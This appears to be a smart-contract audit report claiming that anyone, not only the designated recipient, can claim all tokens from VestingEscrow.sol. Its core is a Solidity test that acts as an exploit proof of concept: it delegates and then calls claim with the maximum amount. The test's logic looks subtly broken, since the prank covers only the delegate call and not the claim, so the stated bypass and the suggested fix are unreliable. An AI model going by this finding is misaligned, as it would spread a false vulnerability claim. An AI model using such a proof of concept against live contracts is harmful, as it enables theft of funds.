# Unauthorized Token Claim in VestingEscrow.sol

## Summary

In VestingEscrow.sol anyone can claim and not just the recepient who was designed to do so.

## Vulnerability Detail

Although the claim(address beneficiary, uint256 amount) function in VestingEscrow.sol is protected by the onlyRecipient modifier, it can still be bypassed within the VestingEscrow contract context. This vulnerability allows any user to withdraw the entire amount deposited during the contract's creation.

The POC bellow showcase exactly how a normal user can claim all the tokens, you can add this function in VestingEscrow.t.sol .
```solidity
    function testAnyoneCanClaimAndNotJustRecepient() public {
        vm.warp(endTime); // Sets block.timestamp to endTime
        
        vm.prank(USER); // Here you can see that we are conected as USER and not  recipient
       
        deployedVesting.delegate(ozVotingAdaptor.encodeDelegateCallData(USER)); //we call delegate from user account

        console.log("Balance of user before the claim",token.balanceOf(USER));   // this will be 0 before claim

        deployedVesting.claim(USER, type(uint256).max); //we call claim with max value and the user address as beneficiary 

        console.log("Balance of user after the claim",token.balanceOf(USER));  // this will be 1 ETH since at setUp() we specified the amount to be 1 ETH

    }
    
```
To clarify, we ensured that we reach the endTime to be eligible for token claiming. Just before initiating the claim process, we execute the delegate function with the USER address.

## Impact

The vulnerability allows anyone to claim and collect funds from the contract that were originally deposited during its creation.

## Tool used

Manual Review

## Recommendation

I highly recommend the project to replace the usage of onlyRecipient as a safeguard with onlyOwner which represent owner of that contract.
